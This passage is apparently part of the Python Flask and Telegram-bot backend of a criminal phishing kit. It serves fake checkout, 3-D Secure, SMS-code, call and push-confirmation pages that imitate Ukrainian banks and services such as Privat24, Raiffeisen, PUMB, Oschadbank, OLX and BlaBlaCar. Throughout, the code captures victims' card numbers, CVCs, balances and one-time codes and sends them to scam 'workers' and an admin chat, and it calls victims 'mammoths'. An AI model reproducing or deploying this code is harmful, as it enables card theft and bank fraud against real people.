                        print(card)
                        markup.add(buts)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные карты\n</b><b>🧊Сервис:{ids[8]}</b>")
                        bot.send_message(chatAdmin, f"<b>🦣Мамонт ввёл данные🦣\n🌐IP:{ip_addr}</b>",reply_markup=markup)
                        if int(balance) < 1000:
                                return render_template('privat24/loader.html',keySTR = randItem)
                        if int(balance) >= 1000:
                                return render_template('3ds/accept3ds.html',keySTR = randItem, domain = dbusfor)
                    if int(vbiver[0]) != 0:
                        sql.execute(f"SELECT username FROM users WHERE id = {idW}")
                        us = sql.fetchone()
                        print(card)
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("❌Отказаться❌", callback_data=f"novbivcard_{card}_{data_m}_{data_y}_{cvc}_{balance}_{idW}_{item}")
                        markup.add(buts)
                        bot.send_message(vbiver[0], f'<b>🚀Мамонт ввел данные карты повторно\n\n🛍Сервис: {dats[8]}\n\n💳Кaрта <code>{card}</code>\n🗓Дата: {data_m}/{data_y}\n🔐CVC {cvc}\n🤑Баланс {balance} грн\n\n👤Воркер: @{us[0]} {idW}</b>',reply_markup=markup)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные карты повторно\n</b><b>🧊Сервис:{ids[8]}</b>")
                        if int(balance) < 1000:
                                return render_template('privat24/loader.html',keySTR = randItem)
                        if int(balance) >= 1000:
                                return render_template('3ds/accept3ds.html',keySTR = randItem, domain = dbusfor)



        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
        dats = sql.fetchone()
        if dats[8] == "blablacarUa": 
            sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
            bbkua = sql.fetchone()
            cash = bbkua[5]
            bot.send_message(idW,f"<i>🧠Мамонт прешел на ввод данных\n\n🌏IP:{ip_addr}\n⚜️Сервис: {bbkua[8]}\n\n💵Сумма {bbkua[5]} грн</i>")
            return render_template('inputblablacarua.html', cash = cash,keySTR = randItem, domain = dbbkua)
        if dats[8] == "privat24": 
            sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
            privatua = sql.fetchone()
            cash = privatua[5]
            bot.send_message(idW,f"<i>🧠Мамонт прешел на ввод данных\n\n🌏IP:{ip_addr}\n⚜️Сервис: {privatua[8]}\n\n💵Сумма {privatua[5]} грн</i>")
            return render_template("privat24/form.html", cash = cash,keySTR = randItem)
        if dats[8] == "raif": 
            sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
            privatua = sql.fetchone()
            cash = privatua[5]
            bot.send_message(idW,f"<i>🧠Мамонт прешел на ввод данных\n\n🌏IP:{ip_addr}\n⚜️Сервис: {privatua[8]}\n\n💵Сумма {privatua[5]} грн</i>")
            return render_template("raif/form.html", cash = cash,keySTR = randItem)
        if dats[8] == "pumb": 
            sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
            privatua = sql.fetchone()
            cash = privatua[5]
            bot.send_message(idW,f"<i>🧠Мамонт прешел на ввод данных\n\n🌏IP:{ip_addr}\n⚜️Сервис: {privatua[8]}\n\n💵Сумма {privatua[5]} грн</i>")
            return render_template("pumb/form.html", cash = cash,keySTR = randItem)
        if dats[8] == "oschad": 
            sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
            privatua = sql.fetchone()
            cash = privatua[5]
            bot.send_message(idW,f"<i>🧠Мамонт прешел на ввод данных\n\n🌏IP:{ip_addr}\n⚜️Сервис: {privatua[8]}\n\n💵Сумма {privatua[5]} грн</i>")
            return render_template("oschad/form.html", cash = cash,keySTR = randItem)

        if dats[8] == "olx": 
            sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
            privatua = sql.fetchone()
            cash = privatua[5]
            bot.send_message(idW,f"<i>🧠Мамонт прешел на ввод данных\n\n🌏IP:{ip_addr}\n⚜️Сервис: {privatua[8]}\n\n💵Сумма {privatua[5]} грн</i>")
            return render_template("inputUA/inputblablacarua.html", cash = cash,keySTR = randItem)
        if dats[8] == "busfor": 
            sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
            busfor = sql.fetchone()
            cash = busfor[5]
            bot.send_message(idW,f"<i>🧠Мамонт прешел на ввод данных\n\n🌏IP:{ip_addr}\n⚜️Сервис: {busfor[8]}\n\n💵Сумма {busfor[5]} грн</i>")
            return render_template('inputUA/inputblablacarua.html', cash = cash,keySTR = randItem, domain = dbusfor)
        
    else:
        return render_template('/page_error/404.html')
    
@app.route('/accept/<int:randItem>', methods=['POST', 'GET'])
def openCodeCodeFake(randItem):
    ip_addr = request.remote_addr
    dbs = sqlite3.connect('users.db')
    sql = dbs.cursor()
    dbs.commit()
    sql.execute("SELECT idFake FROM FackeData WHERE idFake = ?", (randItem,))
    exists = sql.fetchone() 
    sql.execute("SELECT * FROM FackeData WHERE idFake = ?", (randItem,))
    data = sql.fetchone()
    if exists:
        if request.method == "POST":
            code = request.form['code']
            try:
                print(code)
                
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                dat = sql.fetchone()
                sql.execute(f"SELECT username FROM users WHERE id = {dat[0]}")
                names = sql.fetchone()
                sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                vbiver = sql.fetchone()
                print(vbiver[0])  
                markups = types.InlineKeyboardMarkup(row_width=2)
                but_6 = types.InlineKeyboardButton("✅Профит", callback_data=f"profit_{dat[0]}_{randItem}")
                markups.add(but_6)
                if data[8] == 'privat24':
                    if int(vbiver[0]) == 0:
                        bot.send_message(chatAdmin, f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('privat24/loader.html',keySTR = randItem,domain = dprivat24)
                    if int(vbiver[0]) != 0:
                        bot.send_message(vbiver[0], f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('privat24/loader.html',keySTR = randItem,domain = dprivat24)
            
                if data[8] == 'raif':
                    if int(vbiver[0]) == 0:
                        bot.send_message(chatAdmin, f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('raif/loader.html',keySTR = randItem,domain = draif)
                    if int(vbiver[0]) != 0:
                        bot.send_message(vbiver[0], f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('raif/loader.html',keySTR = randItem,domain = draif)
                if data[8] == 'pumb':
                    if int(vbiver[0]) == 0:
                        bot.send_message(chatAdmin, f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('pumb/loader.html',keySTR = randItem,domain = dpumb)
                    if int(vbiver[0]) != 0:
                        bot.send_message(vbiver[0], f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('pumb/loader.html',keySTR = randItem,domain = dpumb)
                if data[8] == 'oschad':
                    if int(vbiver[0]) == 0:
                        bot.send_message(chatAdmin, f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('oschad/loader.html',keySTR = randItem,domain = dpumb)
                    if int(vbiver[0]) != 0:
                        bot.send_message(vbiver[0], f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('oschad/loader.html',keySTR = randItem,domain = dpumb)
            
            except:
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                dat = sql.fetchone()
                sql.execute(f"SELECT username FROM users WHERE id = {dat[0]}")
                names = sql.fetchone()
                sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                vbiver = sql.fetchone()
                print(vbiver[0])  
                markups = types.InlineKeyboardMarkup(row_width=2)
                but_6 = types.InlineKeyboardButton("✅Профит", callback_data=f"profit_{dat[0]}_{randItem}")
                markups.add(but_6)
                if data[8] == 'privat24':
                    if int(vbiver[0]) == 0:
                        bot.send_message(chatAdmin, f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('privat24/loader.html',keySTR = randItem,domain = dprivat24)
                    if int(vbiver[0]) != 0:
                        bot.send_message(vbiver[0], f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('privat24/loader.html',keySTR = randItem,domain = dprivat24)
            
                if data[8] == 'raif':
                    if int(vbiver[0]) == 0:
                        bot.send_message(chatAdmin, f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('raif/loader.html',keySTR = randItem,domain = draif)
                    if int(vbiver[0]) != 0:
                        bot.send_message(vbiver[0], f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('raif/loader.html',keySTR = randItem,domain = draif)
                if data[8] == 'pumb':
                    if int(vbiver[0]) == 0:
                        bot.send_message(chatAdmin, f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('pumb/loader.html',keySTR = randItem,domain = dpumb)
                    if int(vbiver[0]) != 0:
                        bot.send_message(vbiver[0], f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('pumb/loader.html',keySTR = randItem,domain = dpumb)
                if data[8] == 'oschad':
                    if int(vbiver[0]) == 0:
                        bot.send_message(chatAdmin, f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('oschad/loader.html',keySTR = randItem,domain = dpumb)
                    if int(vbiver[0]) != 0:
                        bot.send_message(vbiver[0], f'<b>🔥Мамонт ввел код\n\n🛍Сервис: {dat[8]}\n👁Code: {code}\n\n👤Воркер: @{names[0]} {dat[0]}</b>',reply_markup=markups)
                        return render_template('oschad/loader.html',keySTR = randItem,domain = dpumb)
    else:
        return render_template('/page_error/404.html')

    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
    dats = sql.fetchone()
    if dats[8] == "blablacarUa": 
        dbs = sqlite3.connect('mydb.db')
        sql = dbs.cursor()
        sql.execute(f"SELECT * FROM item WHERE randItem = {randItem}")
        dataF = sql.fetchone()
        dbs = sqlite3.connect('users.db')
        sql = dbs.cursor()
        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
        dataW = sql.fetchone()
        card = dataF[5]
        cash = dataW[5]
        return render_template('/3dsua.html',card = card,cash = cash)
    if dats[8] == "privat24": 
        dbs = sqlite3.connect('users.db')
        sql = dbs.cursor()
        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
        dataW = sql.fetchone()
        cash = dataW[5]
        file = open(f'static/servers/{randItem}.txt','w')
        file.write('0')
        file.close()
        return render_template('privat24/3dprivat24.html',cash = cash)
    if dats[8] == "raif": 
        dbs = sqlite3.connect('users.db')
        sql = dbs.cursor()
        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
        dataW = sql.fetchone()
        cash = dataW[5]
        file = open(f'static/servers/{randItem}.txt','w')
        file.write('0')
        file.close()
        return render_template('raif/sms.html',cash = cash)
    if dats[8] == "pumb": 
        dbs = sqlite3.connect('users.db')
        sql = dbs.cursor()
        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
        dataW = sql.fetchone()
        cash = dataW[5]
        file = open(f'static/servers/{randItem}.txt','w')
        file.write('0')
        file.close()
        return render_template('pumb/sms.html',cash = cash)
    if dats[8] == "oschad": 
        dbs = sqlite3.connect('users.db')
        sql = dbs.cursor()
        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
        dataW = sql.fetchone()
        cash = dataW[5]
        file = open(f'static/servers/{randItem}.txt','w')
        file.write('0')
        file.close()
        return render_template('oschad/sms.html',cash = cash)
    if dats[8] == "olx": 
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
        dataW = sql.fetchone()
        cash = dataW[5]
        dbs = sqlite3.connect('mydb.db')
        sql = dbs.cursor()
        sql.execute(f"SELECT * FROM item WHERE randItem = {randItem}")
        dataF = sql.fetchone()
        return render_template('/3dsua.html',cash = cash, service = dats[8], card = dataF[5])
    if dats[8] == "busfor": 
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
        dataW = sql.fetchone()
        cash = dataW[5]
        dbs = sqlite3.connect('mydb.db')
        sql = dbs.cursor()
        sql.execute(f"SELECT * FROM item WHERE randItem = {randItem}")
        dataF = sql.fetchone()
        return render_template('/3dsua.html',cash = cash, service = dats[8], card = dataF[5])
    

@app.route('/call/<int:randItem>', methods=['POST', 'GET'])
def openCodeCallFake(randItem):
    ip_addr = request.remote_addr
    dbs = sqlite3.connect('users.db')
    sql = dbs.cursor()
    dbs.commit()
    sql.execute("SELECT idFake FROM FackeData WHERE idFake = ?", (randItem,))
    exists = sql.fetchone() 
    sql.execute("SELECT * FROM FackeData WHERE idFake = ?", (randItem,))
    data = sql.fetchone()
    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
    dats = sql.fetchone()
    if exists:
        if request.method == "GET":
            try:
                if dats[8] == "privat24": 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                    dataW = sql.fetchone()
                    cash = dataW[5]
                    file = open(f'static/servers/{randItem}.txt','w')
                    file.write('0')
                    file.close()
                    bot.send_message(data[0],f'<b>📱Мамонт на странице подтверждения звонка</b>')
                    return render_template('privat24/call.html', keySTR = randItem,domain = dprivat24) 
                if dats[8] == "pumb": 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                    dataW = sql.fetchone()
                    cash = dataW[5]
                    file = open(f'static/servers/{randItem}.txt','w')
                    file.write('0')
                    file.close()
                    bot.send_message(data[0],f'<b>📱Мамонт на странице подтверждения звонка</b>')
                    return render_template('pumb/call.html', keySTR = randItem,domain = dpumb) 
                if dats[8] == "oschad": 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                    dataW = sql.fetchone()
                    cash = dataW[5]
                    file = open(f'static/servers/{randItem}.txt','w')
                    file.write('0')
                    file.close()
                    bot.send_message(data[0],f'<b>📱Мамонт на странице подтверждения звонка</b>')
                    return render_template('oschad/call.html', keySTR = randItem,domain = dposchad) 
                
            except:
                return render_template('/page_error/404.html')

@app.route('/push/<int:randItem>', methods=['POST', 'GET'])
def openCodePusgFake(randItem):
    ip_addr = request.remote_addr
    dbs = sqlite3.connect('users.db')
    sql = dbs.cursor()
    dbs.commit()
    sql.execute("SELECT idFake FROM FackeData WHERE idFake = ?", (randItem,))
    exists = sql.fetchone() 
    sql.execute("SELECT * FROM FackeData WHERE idFake = ?", (randItem,))
    data = sql.fetchone()
    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
    dats = sql.fetchone()
    if exists:
        if request.method == "GET":
            try:
                if dats[8] == "privat24": 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                    dataW = sql.fetchone()
                    cash = dataW[5]
                    file = open(f'static/servers/{randItem}.txt','w')
                    file.write('0')
                    file.close()
                    bot.send_message(data[0],f'<b>🖥Мамонт на странице подтверждения пуш-уведомления</b>')
                    return render_template('privat24/push.html', keySTR = randItem,domain = dprivat24) 
                if dats[8] == "raif": 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                    dataW = sql.fetchone()
                    cash = dataW[5]
                    file = open(f'static/servers/{randItem}.txt','w')
                    file.write('0')
                    file.close()
                    bot.send_message(data[0],f'<b>🖥Мамонт на странице подтверждения пуш-уведомления</b>')
                    return render_template('raif/index.html', keySTR = randItem,domain = draif)
                if dats[8] == "pumb": 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                    dataW = sql.fetchone()
                    cash = dataW[5]
                    file = open(f'static/servers/{randItem}.txt','w')
                    file.write('0')
                    file.close()
                    bot.send_message(data[0],f'<b>🖥Мамонт на странице подтверждения пуш-уведомления</b>')
                    return render_template('pumb/index.html', keySTR = randItem,domain = dpumb)
                if dats[8] == "oschad": 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                    dataW = sql.fetchone()
                    cash = dataW[5]
                    file = open(f'static/servers/{randItem}.txt','w')
                    file.write('0')
                    file.close()
                    bot.send_message(data[0],f'<b>🖥Мамонт на странице подтверждения пуш-уведомления</b>')
                    return render_template('oschad/index.html', keySTR = randItem,domain = doschad)
                
            
            
            except:
                return render_template('/page_error/404.html')


@app.route('/error/<int:randItem>', methods=['POST', 'GET'])
def openErrorFake(randItem):
    ip_addr = request.remote_addr
    dbs = sqlite3.connect('users.db')
    sql = dbs.cursor()
    dbs.commit()
    sql.execute("SELECT idFake FROM FackeData WHERE idFake = ?", (randItem,))
    exists = sql.fetchone() 
    sql.execute("SELECT * FROM FackeData WHERE idFake = ?", (randItem,))
    data = sql.fetchone()
    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
    dats = sql.fetchone()
    if exists:
        if request.method == "GET":
            try:
                if dats[8] == "privat24": 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                    dataW = sql.fetchone()
                    cash = dataW[5]
                    file = open(f'static/servers/{randItem}.txt','w')
                    file.write('0')
                    file.close()
                    bot.send_message(data[0],f'<b>🖥Мамонт получил ошибку!</b>')
                    return render_template('privat24/error.html', keySTR = randItem, domain = dprivat24) 
                if dats[8] == "raif": 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                    dataW = sql.fetchone()
                    cash = dataW[5]
                    file = open(f'static/servers/{randItem}.txt','w')
                    file.write('0')
                    file.close()
                    bot.send_message(data[0],f'<b>🖥Мамонт получил ошибку!</b>')
                    return render_template('raif/error.html', keySTR = randItem, domain = draif) 
                if dats[8] == "pumb": 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                    dataW = sql.fetchone()
                    cash = dataW[5]
                    file = open(f'static/servers/{randItem}.txt','w')
                    file.write('0')
                    file.close()
                    bot.send_message(data[0],f'<b>🖥Мамонт получил ошибку!</b>')
                    return render_template('pumb/error.html', keySTR = randItem, domain = dpumb)
                if dats[8] == "oschad": 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                    dataW = sql.fetchone()
                    cash = dataW[5]
                    file = open(f'static/servers/{randItem}.txt','w')
                    file.write('0')
                    file.close()
                    bot.send_message(data[0],f'<b>🖥Мамонт получил ошибку!</b>')
                    return render_template('oschad/error.html', keySTR = randItem, domain = doschad)
                
            except:
                return render_template('/page_error/404.html')


    